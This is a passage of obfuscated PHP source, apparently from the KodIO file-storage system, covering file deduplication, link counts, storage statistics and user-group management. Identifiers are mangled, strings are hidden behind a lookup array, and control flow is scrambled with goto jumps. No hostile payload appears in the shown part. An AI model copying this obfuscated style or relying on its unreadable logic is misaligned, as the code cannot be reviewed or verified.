$F”¸Î¾ğ­ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$c†ôùæœ‹¡) { return !1; } $c†ôùæœ‹¡[$F”¸Î¾ğ­[78]] = intval($c†ôùæœ‹¡[$F”¸Î¾ğ­[78]]); if (!$c†ôùæœ‹¡[$F”¸Î¾ğ­[78]] && strlen($c†ôùæœ‹¡[$F”¸Î¾ğ­[171]]) > 32) { $c†ôùæœ‹¡[$F”¸Î¾ğ­[78]] = intval(substr($c†ôùæœ‹¡[$F”¸Î¾ğ­[171]], 32)); } $EÓï³˜¡ˆ¥ = $this->add($c†ôùæœ‹¡); return $this->find($EÓï³˜¡ˆ¥); } public function addFile($cÒ­‹£ìšŞ, $e³Ëà—¬âÇ, $EÉ¬‰‘ƒ›á = false) { goto dò‰ö°Óò; CèÂ«ÌÑÒ: return $Fî½‘âš; goto aŞÚÓ¨ÈÎ‡; DØñ»ò¦Í: $Aø¾†ÁÛæ¬ = $this->addFileMake($cÒ­‹£ìšŞ, $Cï½Ú“•, $céóÈ×‹º, $cèšäÔçàå, $e³Ëà—¬âÇ, $EÉ¬‰‘ƒ›á); $Fî½‘âš = $this->addFileData($Aø¾†ÁÛæ¬); CacheLock::unlock($EçÆê¦èÀŸ); goto CèÂ«ÌÑÒ; dò‰ö°Óò: $céóÈ×‹º = IO::hashSimple($cÒ­‹£ìšŞ); $cèšäÔçàå = IO::hashMd5($cÒ­‹£ìšŞ); $Cï½Ú“• = IO::size($cÒ­‹£ìšŞ); goto bîìİ¾¦‹Ø; bîìİ¾¦‹Ø: $EçÆê¦èÀŸ = $_SERVER[ÒÆ›ÆØÎ¾][1740] . $cèšäÔçàå; CacheLock::lock($EçÆê¦èÀŸ); if ($aÊ›®Ó‹™ê = $this->addFileCheckExist($céóÈ×‹º, $cèšäÔçàå, $Cï½Ú“•)) { CacheLock::unlock($EçÆê¦èÀŸ); return $aÊ›®Ó‹™ê; } goto DØñ»ò¦Í; aŞÚÓ¨ÈÎ‡: } public function addFileMake($CÓŞ˜à£­›, $CÎ„ƒ£–ºÂ, $bğîå½­Á¸, $f–Âì†Æâ , $FšæëÁÄƒš, $f„ÁÊˆàùø) { goto B¥å‡¶ ; A¿‹˜‡Š§Í: $Bˆ…ÀİŠğ = get_path_this($e¤²„ä¤‡); if ($f„ÁÊˆàùø) { $c¹Ûîµí¶Ä = IO::move($CÓŞ˜à£­›, $aæ´š¿šÀÁ, !1, $Bˆ…ÀİŠğ); } else { $c¹Ûîµí¶Ä = IO::copy($CÓŞ˜à£­›, $aæ´š¿šÀÁ, !1, $Bˆ…ÀİŠğ); } if (!$c¹Ûîµí¶Ä) { return !1; } goto FÁÆÜßë„; B¥å‡¶ : $eŞÒã¹Ù½ˆ =& $_SERVER[ÒÆ›ÆØÎ¾]; $e¤²„ä¤‡ = $this->createFileName($FšæëÁÄƒš, $bğîå½­Á¸, $f–Âì†Æâ ); $aæ´š¿šÀÁ = get_path_father($e¤²„ä¤‡); goto A¿‹˜‡Š§Í; FÁÆÜßë„: $f¦ñº½°–¥ = KodIO::defaultDriver(); $eƒÁîà“ƒ = array($eŞÒã¹Ù½ˆ[548] => $CÎ„ƒ£–ºÂ, $eŞÒã¹Ù½ˆ[1737] => 1, $eŞÒã¹Ù½ˆ[413] => $FšæëÁÄƒš, $eŞÒã¹Ù½ˆ[765] => $f¦ñº½°–¥[$eŞÒã¹Ù½ˆ[393]], $eŞÒã¹Ù½ˆ[414] => $e¤²„ä¤‡, $eŞÒã¹Ù½ˆ[1738] => $bğîå½­Á¸, $eŞÒã¹Ù½ˆ[1739] => $f–Âì†Æâ ); return $eƒÁîà“ƒ; goto eéº—§ëš; eéº—§ëš: } public function addFileCheckExist($fñéÙ“¯ï, $f¢ËÀ±êÒƒ, $F¸Ò¾òÈ£) { $c™â×Â™„ã =& $_SERVER[ÒÆ›ÆØÎ¾]; $dÏ¯ÁÕ¯™© = $this->findByHash($fñéÙ“¯ï, $f¢ËÀ±êÒƒ); if (!$dÏ¯ÁÕ¯™©) { return !1; } $A¢É«£è½ = array($c™â×Â™„ã[1737] => intval($dÏ¯ÁÕ¯™©[$c™â×Â™„ã[1741]]) + 1, $c™â×Â™„ã[548] => $F¸Ò¾òÈ£); $this->where(array($c™â×Â™„ã[448] => $dÏ¯ÁÕ¯™©[$c™â×Â™„ã[447]]))->save($A¢É«£è½); return $dÏ¯ÁÕ¯™©; } public function remove($cç•¶Çêæ) { $this->linkCountChange($cç•¶Çêæ, !1); $this->clearEmpty(); return !0; } public function linkAdd($a†¼ÕŠ²÷¸) { $this->linkCountChange($a†¼ÕŠ²÷¸, !0); } public function linkCountChange($e¹éÔºõ¥, $A¹Â¨¢÷ñ) { goto DâÌÈà„; f¡ˆÙ‡¦‘: foreach ($a‘ˆªĞ¶ˆ as $E”å–Šœ¨• => $aë§ëˆÕ‹) { $c½ˆÓÆ„Ä = $aë§ëˆÕ‹ . $E÷¼’‘©Å[33]; if (!$Dò¢±åºÓ—[$c½ˆÓÆ„Ä]) { $Dò¢±åºÓ—[$c½ˆÓÆ„Ä] = array(); } $Dò¢±åºÓ—[$c½ˆÓÆ„Ä][] = $E”å–Šœ¨•; } foreach ($Dò¢±åºÓ— as $aë§ëˆÕ‹ => $DÏáµîˆÁ”) { if (!$DÏáµîˆÁ”) { continue; } $aë§ëˆÕ‹ = $A¹Â¨¢÷ñ ? $aë§ëˆÕ‹ : -intval($aë§ëˆÕ‹); $Fµƒ…¬í’Ê = array($E÷¼’‘©Å[447] => array($E÷¼’‘©Å[7], $DÏáµîˆÁ”)); if ($aë§ëˆÕ‹ < 0) { $Fµƒ…¬í’Ê[$E÷¼’‘©Å[1741]] = array($E÷¼’‘©Å[963], abs($aë§ëˆÕ‹)); } $this->where($Fµƒ…¬í’Ê)->setAdd($E÷¼’‘©Å[1741], $aë§ëˆÕ‹); } goto B”æ«ÏµˆÂ; Eò²£šÎ¯³: $a‘ˆªĞ¶ˆ = array(); foreach ($e¹éÔºõ¥ as $E”å–Šœ¨•) { $c½ˆÓÆ„Ä = $E”å–Šœ¨• . $E÷¼’‘©Å[33]; if (!$a‘ˆªĞ¶ˆ[$c½ˆÓÆ„Ä]) { $a‘ˆªĞ¶ˆ[$c½ˆÓÆ„Ä] = 0; } $a‘ˆªĞ¶ˆ[$c½ˆÓÆ„Ä]++; } $Dò¢±åºÓ— = array(); goto f¡ˆÙ‡¦‘; DâÌÈà„: $E÷¼’‘©Å =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$e¹éÔºõ¥) { return; } if (!is_array($e¹éÔºõ¥)) { $e¹éÔºõ¥ = array($e¹éÔºõ¥); } goto Eò²£šÎ¯³; B”æ«ÏµˆÂ: } public function findByHash($FÍäÁ·†àÊ, $C°ÌÊ­õÅ‡ = false) { $AŒ…©½‡à³ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$FÍäÁ·†àÊ && !$C°ÌÊ­õÅ‡) { return !1; } $bã®„¾ò¨Æ = array($AŒ…©½‡à³[1738] => $FÍäÁ·†àÊ); if ($C°ÌÊ­õÅ‡) { $bã®„¾ò¨Æ = array($AŒ…©½‡à³[1739] => $C°ÌÊ­õÅ‡); } return $this->order($AŒ…©½‡à³[1742])->where($bã®„¾ò¨Æ)->find(); } public function clearEmpty($a×ŠÛ‰šÆ = 0) { goto f™ã·ÎÚ½; C†ÖÙŠÊ¿ğ: $cÍ‚Å‚ç«¼ = $this->where($fÃÇÅÈê§È)->select(); if (!$cÍ‚Å‚ç«¼) { return; } $cèÇ Øƒí¤ = new Task($aÁ×»ƒÄÉÒ[1744], $aÁ×»ƒÄÉÒ[33], count($cÍ‚Å‚ç«¼)); goto F‚ÏÁÌ™ï§; F‚ÏÁÌ™ï§: foreach ($cÍ‚Å‚ç«¼ as $Bå´îß„â˜) { $cèÇ Øƒí¤->update(1); $this->resetFile($Bå´îß„â˜); } $cèÇ Øƒí¤->end(); goto Eò‚¹ˆäÃ÷; f™ã·ÎÚ½: $aÁ×»ƒÄÉÒ =& $_SERVER[ÒÆ›ÆØÎ¾]; $aÂá»î¨„° = time() - 3600 * 24 * $a×ŠÛ‰šÆ; $fÃÇÅÈê§È = $aÁ×»ƒÄÉÒ[1743] . $aÂá»î¨„°; goto C†ÖÙŠÊ¿ğ; Eò‚¹ˆäÃ÷: } public function resetFile($A¢éâÖ“™ê) { goto cŞº†ãƒí‰; Eäƒ²ê³á: if ($A¢éâÖ“™ê[$fâŞ˜†»“¶[1741]] != $bõ†ğ…›—) { $this->where($E¤¨ß©Ÿó’)->save(array($fâŞ˜†»“¶[1737] => $bõ†ğ…›—)); } goto a°°‚ÈŞĞµ; f¼Š¿ÈÜ‘: $b²ğóù ¼ó = Model($fâŞ˜†»“¶[1745])->where($E¤¨ß©Ÿó’)->count(); $bõ†ğ…›— = intval($A“×ÀÄ°Ù) + intval($b²ğóù ¼ó); if ($bõ†ğ…›— == 0) { IO::remove($A¢éâÖ“™ê[$fâŞ˜†»“¶[76]]); Model($fâŞ˜†»“¶[1746])->delete($A¢éâÖ“™ê[$fâŞ˜†»“¶[447]]); $this->where($E¤¨ß©Ÿó’)->delete(); $this->metaSet($A¢éâÖ“™ê[$fâŞ˜†»“¶[447]], null, null); return; } goto Eäƒ²ê³á; cŞº†ãƒí‰: $fâŞ˜†»“¶ =& $_SERVER[ÒÆ›ÆØÎ¾]; $E¤¨ß©Ÿó’ = array($fâŞ˜†»“¶[448] => $A¢éâÖ“™ê[$fâŞ˜†»“¶[447]]); $A“×ÀÄ°Ù = Model($fâŞ˜†»“¶[1197])->where($E¤¨ß©Ÿó’)->count(); goto f¼Š¿ÈÜ‘; a°°‚ÈŞĞµ: } public function storageInfo($fÀŒ¸ìˆÜ = false) { goto E÷ÂòÔ”õ‰; e™õÆèŸæ: for ($aÊ¤‹åãå = 0; $aÊ¤‹åãå < $CºÃ±à„£; $aÊ¤‹åãå = $aÊ¤‹åãå + $dÊ–­ºñèó) { $F…œ†–ˆæ• = $this->limit($aÊ¤‹åãå, $aÊ¤‹åãå + $dÊ–­ºñèó)->select(); foreach ($F…œ†–ˆæ• as $BÕˆóËšõÊ) { $Bà´Î¬ëŸ += $BÕˆóËšõÊ[$A£‘ğ¶§Ş[78]] * $BÕˆóËšõÊ[$A£‘ğ¶§Ş[1741]]; $bÓ³î•ª®¨ += $BÕˆóËšõÊ[$A£‘ğ¶§Ş[78]] * ($BÕˆóËšõÊ[$A£‘ğ¶§Ş[1741]] - 1); $AÛøäÜ  += $BÕˆóËšõÊ[$A£‘ğ¶§Ş[1741]]; } } $A‚¯¾”Ò = array($A£‘ğ¶§Ş[1747] => $Bà´Î¬ëŸ, $A£‘ğ¶§Ş[1748] => $bÓ³î•ª®¨, $A£‘ğ¶§Ş[1749] => $bÓ³î•ª®¨ / $Bà´Î¬ëŸ, $A£‘ğ¶§Ş[82] => $CºÃ±à„£, $A£‘ğ¶§Ş[1750] => $AÛøäÜ ); return $A‚¯¾”Ò; goto BçÊõè•Ú; A¾í±¦îÊ„: $Bà´Î¬ëŸ = 1; $AÛøäÜ  = 0; $dÊ–­ºñèó = 5000; goto e™õÆèŸæ; E÷ÂòÔ”õ‰: $A£‘ğ¶§Ş =& $_SERVER[ÒÆ›ÆØÎ¾]; $CºÃ±à„£ = $this->count() + 0.0; $bÓ³î•ª®¨ = 0; goto A¾í±¦îÊ„; BçÊõè•Ú: } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\x6f\165\160"; protected $tableMeta = array("\164\x61\x62\x6c\145\x4e\141\x6d\x65" => "\x67\x72\157\x75\160\x5f\x6d\x65\164\141", "\155\145\x74\x61\106\x69\145\x6c\144" => "\147\x72\x6f\x75\x70\x49\104"); protected function cacheFunctionAlias($b§°ß…Ÿ‹Â) { $D¾³ÔÎïö‡ =& $_SERVER[ÒÆ›ÆØÎ¾]; return array($D¾³ÔÎïö‡[1751] => array($b§°ß…Ÿ‹Â[0], $D¾³ÔÎïö‡[1752]), $D¾³ÔÎïö‡[1753] => array($b§°ß…Ÿ‹Â[0], $D¾³ÔÎïö‡[1752])); } protected function getInfo($bí²‡İÇ‹ä) { $d–æ‡øœŞ½ = $this->getInfoSimple($bí²‡İÇ‹ä); if (!$d–æ‡øœŞ½) { return !1; } return $this->_listDataApplyItem($d–æ‡øœŞ½); } protected function getInfoSimple($aÛ‰ù­æØ, $a©ÜŒò¶ê = false) { $dÉšÓµÄ‘à =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($a©ÜŒò¶ê) { $C›ƒªÅâ•Š = array($dÉšÓµÄ‘à[1681] => intval($aÛ‰ù­æØ)); $böšõ„§÷² = $this->where($C›ƒªÅâ•Š)->find(); return is_array($böšõ„§÷²) ? $böšõ„§÷² : array(); } return $this->cacheFunctionGet($dÉšÓµÄ‘à[1754], $aÛ‰ù­æØ); } protected function groupAdd($B‘ÙÏ½½) { goto d…‚ßÎŒÅ„; a£±÷·¼İà: if (!empty($B‘ÙÏ½½[$FãŞËÛ¨¼Ë[1681]])) { $Fç†‰²ù¢“[$FãŞËÛ¨¼Ë[1681]] = $B‘ÙÏ½½[$FãŞËÛ¨¼Ë[1681]]; } $bÀæÅäÛÀ = $this->add($Fç†‰²ù¢“); $this->setNamePinyin($bÀæÅäÛÀ, $Fç†‰²ù¢“[$FãŞËÛ¨¼Ë[28]]); goto BĞâ”Ñö‹ì; d…‚ßÎŒÅ„: $FãŞËÛ¨¼Ë =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$B‘ÙÏ½½[$FãŞËÛ¨¼Ë[478]] && isset($B‘ÙÏ½½[$FãŞËÛ¨¼Ë[1681]]) && $B‘ÙÏ½½[$FãŞËÛ¨¼Ë[1681]] == 1) { if ($f‹ÄÕÂ¼± = $this->getInfoSimple($B‘ÙÏ½½[$FãŞËÛ¨¼Ë[1681]], !0)) { return $B‘ÙÏ½½[$FãŞËÛ¨¼Ë[1681]]; } } else { $f‹ÄÕÂ¼± = $this->getInfoSimple($B‘ÙÏ½½[$FãŞËÛ¨¼Ë[478]]); if (!$f‹ÄÕÂ¼±) { return !1; } } $c¹Š³”äĞˆ = $FãŞËÛ¨¼Ë[498]; goto BÔŞ¹ÎŞ—Ú; BĞâ”Ñö‹ì: if (isset($B‘ÙÏ½½[$FãŞËÛ¨¼Ë[1757]])) { $this->metaSet($bÀæÅäÛÀ, array($FãŞËÛ¨¼Ë[1757] => $B‘ÙÏ½½[$FãŞËÛ¨¼Ë[1757]], $FãŞËÛ¨¼Ë[1758] => $B‘ÙÏ½½[$FãŞËÛ¨¼Ë[1758]])); unset($B‘ÙÏ½½[$FãŞËÛ¨¼Ë[1757]]); unset($B‘ÙÏ½½[$FãŞËÛ¨¼Ë[1758]]); } Model($FãŞËÛ¨¼Ë[1197])->groupRootAdd($bÀæÅäÛÀ); return $bÀæÅäÛÀ; goto AÔ°®À‘ß‰; BÔŞ¹ÎŞ—Ú: if ($f‹ÄÕÂ¼±[$FãŞËÛ¨¼Ë[487]]) { $c¹Š³”äĞˆ = $f‹ÄÕÂ¼±[$FãŞËÛ¨¼Ë[487]] . $f‹ÄÕÂ¼±[$FãŞËÛ¨¼Ë[1681]] . $FãŞËÛ¨¼Ë[47]; } $Fç†‰²ù¢“ = array($FãŞËÛ¨¼Ë[413] => $this->groupNameAuto($B‘ÙÏ½½[$FãŞËÛ¨¼Ë[478]], $B‘ÙÏ½½[$FãŞËÛ¨¼Ë[28]]), $FãŞËÛ¨¼Ë[394] => $B‘ÙÏ½½[$FãŞËÛ¨¼Ë[478]], $FãŞËÛ¨¼Ë[553] => $c¹Š³”äĞˆ, $FãŞËÛ¨¼Ë[1755] => $B‘ÙÏ½½[$FãŞËÛ¨¼Ë[1665]], $FãŞËÛ¨¼Ë[1756] => 0, $FãŞËÛ¨¼Ë[1685] => 0); if (isset($B‘ÙÏ½½[$FãŞËÛ¨¼Ë[1704]])) { $Fç†‰²ù¢“[$FãŞËÛ¨¼Ë[1704]] = $B‘ÙÏ½½[$FãŞËÛ¨¼Ë[1704]]; } else { $Fˆ¢´öƒ = $this->max($FãŞËÛ¨¼Ë[1704]); if (!$Fˆ¢´öƒ) { $Fˆ¢´öƒ = 0; } $Fç†‰²ù¢“[$FãŞËÛ¨¼Ë[1704]] = $Fˆ¢´öƒ + 1; } goto a£±÷·¼İà; AÔ°®À‘ß‰: } protected function groupEdit($F¨»‰ëùŸ›, $FÒƒ——ôË) { goto eäªÌåÅ; eäªÌåÅ: $dİŒ¯Êã¨‘ =& $_SERVER[ÒÆ›ÆØÎ¾]; $F¢Ğ“ó§´ = $this->getInfoSimple($F¨»‰ëùŸ›); if (!$F¢Ğ“ó§´) { return !1; } goto F³•Ø„ìÈ; F³•Ø„ìÈ: if (!empty($FÒƒ——ôË[$dİŒ¯Êã¨‘[478]])) { $E¯îÛ½ˆ­é = $this->getInfoSimple($FÒƒ——ôË[$dİŒ¯Êã¨‘[478]]); if (!$E¯îÛ½ˆ­é) { return !1; } if ($F¢Ğ“ó§´[$dİŒ¯Êã¨‘[1681]] == $E¯îÛ½ˆ­é[$dİŒ¯Êã¨‘[1681]]) { return !1; } if ($FÒƒ——ôË[$dİŒ¯Êã¨‘[478]] != $F¢Ğ“ó§´[$dİŒ¯Êã¨‘[478]]) { if ($E¯îÛ½ˆ­é[$dİŒ¯Êã¨‘[487]] !== $F¢Ğ“ó§´[$dİŒ¯Êã¨‘[487]] && strpos($E¯îÛ½ˆ­é[$dİŒ¯Êã¨‘[487]], $F¢Ğ“ó§´[$dİŒ¯Êã¨‘[487]] . $F¢Ğ“ó§´[$dİŒ¯Êã¨‘[1681]] . $dİŒ¯Êã¨‘[47]) === 0) { return !1; } $FÒƒ——ôË[$dİŒ¯Êã¨‘[553]] = $E¯îÛ½ˆ­é[$dİŒ¯Êã¨‘[487]] . $FÒƒ——ôË[$dİŒ¯Êã¨‘[478]] . $dİŒ¯Êã¨‘[47]; $this->_changeChildLevel($F¢Ğ“ó§´, $E¯îÛ½ˆ­é); } } if (isset($FÒƒ——ôË[$dİŒ¯Êã¨‘[28]])) { $this->setNamePinyin($F¨»‰ëùŸ›, $FÒƒ——ôË[$dİŒ¯Êã¨‘[28]]); } if (isset($FÒƒ——ôË[$dİŒ¯Êã¨‘[1757]])) { $this->metaSet($F¨»‰ëùŸ›, array($dİŒ¯Êã¨‘[1757] => $FÒƒ——ôË[$dİŒ¯Êã¨‘[1757]], $dİŒ¯Êã¨‘[1758] => $FÒƒ——ôË[$dİŒ¯Êã¨‘[1758]])); unset($FÒƒ——ôË[$dİŒ¯Êã¨‘[1757]]); unset($FÒƒ——ôË[$dİŒ¯Êã¨‘[1758]]); } goto e‡ëœí‡Õ; e‡ëœí‡Õ: if (isset($FÒƒ——ôË[$dİŒ¯Êã¨‘[28]]) && $FÒƒ——ôË[$dİŒ¯Êã¨‘[28]] != $F¢Ğ“ó§´[$dİŒ¯Êã¨‘[28]]) { $this->_clearChildrenCache($F¢Ğ“ó§´); } return $this->where(array($dİŒ¯Êã¨‘[1759] => $F¨»‰ëùŸ›))->save($FÒƒ——ôË); goto B¡Æé‘Ôì; B¡Æé‘Ôì: } private function _clearChildrenCache($bŒÃƒÂÛğÔ) { $e°©‹ùì× =& $_SERVER[ÒÆ›ÆØÎ¾]; $FøÉ×¯· = array($e°©‹ùì×[553] => array($e°©‹ùì×[512], $bŒÃƒÂÛğÔ[$e°©‹ùì×[487]] . $bŒÃƒÂÛğÔ[$e°©‹ùì×[1681]] . $e°©‹ùì×[513])); $cšââÃœ’¸ = $this->field($e°©‹ùì×[1681])->where($FøÉ×¯·)->select(); foreach ($cšââÃœ’¸ as $Fğ¶¥¢ÀĞŸ) { $this->cacheFunctionClear($e°©‹ùì×[1760], $Fğ¶¥¢ÀĞŸ[$e°©‹ùì×[1681]]); $this->cacheFunctionClear($e°©‹ùì×[1754], $Fğ¶¥¢ÀĞŸ[$e°©‹ùì×[1681]]); } } private function _changeChildLevel($fÛ¾ˆ¤ã·, $F¥˜¸·áµ, $F·ª²ïÓÕš = false) { goto f«Å‰Øî•Š; Aˆ›®·Šİ±: $this->_clearChildrenCache($fÛ¾ˆ¤ã·); $this->where($fïˆÇœâ)->data($fÖ”ÅÃ…ë)->save(); goto E§˜¦Şœ; aìªÁ›³: if ($F·ª²ïÓÕš) { $fĞ›’ôØãÑ = $F¥˜¸·áµ[$a«ˆ”ÙŒ‹[487]] . $F¥˜¸·áµ[$a«ˆ”ÙŒ‹[1681]] . $a«ˆ”ÙŒ‹[47]; } $fïˆÇœâ = array($a«ˆ”ÙŒ‹[553] => array($a«ˆ”ÙŒ‹[512], $fÛ¾ˆ¤ã·[$a«ˆ”ÙŒ‹[487]] . $fÛ¾ˆ¤ã·[$a«ˆ”ÙŒ‹[1681]] . $a«ˆ”ÙŒ‹[513])); $fÖ”ÅÃ…ë = array($a«ˆ”ÙŒ‹[553] => array($a«ˆ”ÙŒ‹[561], "\162\x65\x70\x6c\x61\x63\x65\x28\x70\x61\162\145\x6e\x74\114\x65\x76\145\154\54\x27{$C‰ì†ëÂ•ä}\47\x2c\47{$fĞ›’ôØãÑ}\x27\51")); goto Aˆ›®·Šİ±; f«Å‰Øî•Š: $a«ˆ”ÙŒ‹ =& $_SERVER[ÒÆ›ÆØÎ¾]; $C‰ì†ëÂ•ä = $fÛ¾ˆ¤ã·[$a«ˆ”ÙŒ‹[487]] . $fÛ¾ˆ¤ã·[$a«ˆ”ÙŒ‹[1681]] . $a«ˆ”ÙŒ‹[47]; $fĞ›’ôØãÑ = $F¥˜¸·áµ[$a«ˆ”ÙŒ‹[487]] . $F¥˜¸·áµ[$a«ˆ”ÙŒ‹[1681]] . $a«ˆ”ÙŒ‹[47] . $fÛ¾ˆ¤ã·[$a«ˆ”ÙŒ‹[1681]] . $a«ˆ”ÙŒ‹[47]; goto aìªÁ›³; E§˜¦Şœ: } public function setNamePinyin($eó„ÂåšŠ³, $FÈš ¸’º½ = false) { $CÉÒùİèÕ® =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$FÈš ¸’º½) { $aèÚÆ‰ßå— = $this->getInfoSimple($eó„ÂåšŠ³); $FÈš ¸’º½ = $aèÚÆ‰ßå—[$CÉÒùİèÕ®[28]]; } if (!Input::check($FÈš ¸’º½, $CÉÒùİèÕ®[556])) { $this->metaSet($eó„ÂåšŠ³, $CÉÒùİèÕ®[444], null); $this->metaSet($eó„ÂåšŠ³, $CÉÒùİèÕ®[443], null); return; } $f¶‹¢‚¿†ó = array($CÉÒùİèÕ®[444] => str_replace($CÉÒùİèÕ®[50], $CÉÒùİèÕ®[33], Pinyin::encode($FÈš ¸’º½)), $CÉÒùİèÕ®[443] => Pinyin::encode($FÈš ¸’º½, $CÉÒùİèÕ®[557])); $this->metaSet($eó„ÂåšŠ³, $f¶‹¢‚¿†ó); } protected function groupStatus($Bˆ™æ‘Â•å, $fŠ¾òÁôò›) { goto AÇÂ‹„Öœí; c•Ğä«ë™œ: if ($fŠ¾òÁôò› == $fÛ‚©İšŠí[87]) { $B“š´¼à— = $this->parentLevelArray($bŠ½„››ôÃ[$fÛ‚©İšŠí[487]]); } else { $dÔõé¡ãºš = array($fÛ‚©İšŠí[553] => array($fÛ‚©İšŠí[512], $bŠ½„››ôÃ[$fÛ‚©İšŠí[487]] . $bŠ½„››ôÃ[$fÛ‚©İšŠí[1681]] . $fÛ‚©İšŠí[513])); $B“š´¼à— = $this->where($dÔõé¡ãºš)->field($fÛ‚©İšŠí[1681])->select(); $B“š´¼à— = array_to_keyvalue($B“š´¼à—, $fÛ‚©İšŠí[33], $fÛ‚©İšŠí[1681]); } $B“š´¼à—[] = $bŠ½„››ôÃ[$fÛ‚©İšŠí[1681]]; $D©¯…¨á†ö = array(); goto aå·ĞÖ–°Æ; aå·ĞÖ–°Æ: foreach ($B“š´¼à— as $Bˆ™æ‘Â•å) { $D©¯…¨á†ö[] = array($fÛ‚©İšŠí[1681] => $Bˆ™æ‘Â•å, $fÛ‚©İšŠí[93] => $fÛ‚©İšŠí[702], $fÛ‚©İšŠí[372] => $fŠ¾òÁôò›); } return Model($fÛ‚©İšŠí[1761])->addAll($D©¯…¨á†ö, array(), !0); goto b¸Š— ©‚š; AÇÂ‹„Öœí: $fÛ‚©İšŠí =& $_SERVER[ÒÆ›ÆØÎ¾]; $bŠ½„››ôÃ = $this->getInfoSimple($Bˆ™æ‘Â•å); if (!$bŠ½„››ôÃ) { return !1; } goto c•Ğä«ë™œ; b¸Š— ©‚š: } protected function groupRemove($DÓ˜”Ñî¸) { goto dªŠ‡ñ¢ Ÿ; dªŠ‡ñ¢ Ÿ: $AØ×İ‹İÚ =& $_SERVER[ÒÆ›ÆØÎ¾]; $bÔ‡Š³×Â = array($AØ×İ‹İÚ[1681] => $DÓ˜”Ñî¸); $Cœ‡×÷µå = $this->where($bÔ‡Š³×Â)->find(); goto a™Ü¯ò¡çƒ; a™Ü¯ò¡çƒ: if (!$Cœ‡×÷µå || $Cœ‡×÷µå[$AØ×İ‹İÚ[478]] == 0) { return !1; } $f»´Õ«ïå» = $this->getInfoSimple($Cœ‡×÷µå[$AØ×İ‹İÚ[478]]); $this->_changeChildLevel($Cœ‡×÷µå, $f»´Õ«ïå», !0); goto d™¼Ä¢ÈÙß; d™¼Ä¢ÈÙß: $this->where(array($AØ×İ‹İÚ[478] => $DÓ˜”Ñî¸))->save(array($AØ×İ‹İÚ[478] => $Cœ‡×÷µå[$AØ×İ‹İÚ[478]])); Model($AØ×İ‹İÚ[1761])->where($bÔ‡Š³×Â)->delete(); Model($AØ×İ‹İÚ[1762])->where($bÔ‡Š³×Â)->delete(); goto c”“¢ğ×Şµ; c”“¢ğ×Şµ: Model($AØ×İ‹İÚ[782])->groupRootRemove($DÓ˜”Ñî¸); return $this->where($bÔ‡Š³×Â)->delete(); goto C¼¥èÇ§âœ; C¼¥èÇ§âœ: } protected function groupSort($E”‡¡Šº•×) { $fƒœÂªÂ± =& $_SERVER[ÒÆ›ÆØÎ¾]; $BªİÕˆ…é = array(); foreach ($E”‡¡Šº•× as $D¯×ÔøÉìø => $aÄ»ïæ¬˜) { $BªİÕˆ…é[] = array($fƒœÂªÂ±[1681], $aÄ»ïæ¬˜, $fƒœÂªÂ±[1704], $D¯×ÔøÉìø + 1); } $this->saveAll($BªİÕˆ…é); } public function listData() { $b©ŸåªÙÚ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($b©ŸåªÙÚ[$_SERVER[ÒÆ›ÆØÎ¾][367]]); return $b©ŸåªÙÚ; } private function _makeOrder($BØÚÜÎ´ = '') { goto DÈ“¶Œ†„Œ; EæŒôÚÈ³–: $EĞŸ†’¨Ï = Input::get($F¬×Ù‰ÀÚ¤[435], $F¬×Ù‰ÀÚ¤[7], $F¬×Ù‰ÀÚ¤[1685], $a±í×‚õ¶‘); $e†©ÃÖªÚ = Input::get($F¬×Ù‰ÀÚ¤[436], $F¬×Ù‰ÀÚ¤[7], $F¬×Ù‰ÀÚ¤[1763], array($F¬×Ù‰ÀÚ¤[1763], $F¬×Ù‰ÀÚ¤[430])); $e†©ÃÖªÚ = $c¦‘ÄŞ›éÆ[$e†©ÃÖªÚ]; goto a«ùï«”®; a«ùï«”®: $BØÚÜÎ´ = $BØÚÜÎ´ . "{$EĞŸ†’¨Ï}\x20{$e†©ÃÖªÚ}\54\x20\x67\162\157\165\160\111\104\x20\x61\x73\143"; return $this->order($BØÚÜÎ´); goto AÆò”ÂóŠ±; DÈ“¶Œ†„Œ: $F¬×Ù‰ÀÚ¤ =& $_SERVER[ÒÆ›ÆØÎ¾]; $a±í×‚õ¶‘ = array($F¬×Ù‰ÀÚ¤[1681], $F¬×Ù‰ÀÚ¤[28], $F¬×Ù‰ÀÚ¤[1667], $F¬×Ù‰ÀÚ¤[194]); $c¦‘ÄŞ›éÆ = array($F¬×Ù‰ÀÚ¤[428] => $F¬×Ù‰ÀÚ¤[429], $F¬×Ù‰ÀÚ¤[430] => $F¬×Ù‰ÀÚ¤[431]); goto EæŒôÚÈ³–; AÆò”ÂóŠ±: } public function listChild($EÚ°¯Ôº•Æ) { $Bñ¦¯¼Ú„ã =& $_SERVER[ÒÆ›ÆØÎ¾]; $F‚¢ì¿ğ’ = $this->where(array($Bñ¦¯¼Ú„ã[478] => $EÚ°¯Ôº•Æ))->_makeOrder()->selectPage(200); $this->_listDataApply($F‚¢ì¿ğ’[$Bñ¦¯¼Ú„ã[367]]); return $F‚¢ì¿ğ’; } public function listByID($E¼Ô»İ¯í) { $dŒ’ë¬“£ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$E¼Ô»İ¯í) { return array(); } $b„ÉÑå†ã = array($dŒ’ë¬“£[1681] => array($dŒ’ë¬“£[7], $E¼Ô»İ¯í)); $f³õÎô†¯ˆ = $this->where($b„ÉÑå†ã)->select(); $this->_listDataApply($f³õÎô†¯ˆ); return $f³õÎô†¯ˆ; } public function listSearch($fÊ§İÉÍ˜µ) { goto b»¨Ù»„õ‚; BÂ’†‚†Êá: if ($aÇâæ³ô×Ò) { $Cğš’Œ÷ªˆ = $this->getInfoSimple($aÇâæ³ô×Ò); $F Û‹ƒó†– = $Cğš’Œ÷ªˆ[$Fëõº¦­Õ[487]] . $aÇâæ³ô×Ò . $Fëõº¦­Õ[513]; $Eº¨·‚‚© = array($Eº¨·‚‚©, array($Fëõº¦­Õ[487] => array($Fëõº¦­Õ[380], $F Û‹ƒó†–))); } $Eº¨·‚‚© = $this->parseWhereLike($Eº¨·‚‚©); $B¸Úç‚Íõˆ = $this->_makeOrder()->where($Eº¨·‚‚©)->selectPage(20); goto Bİ³¬Ó‚¨; b»¨Ù»„õ‚: $Fëõº¦­Õ =& 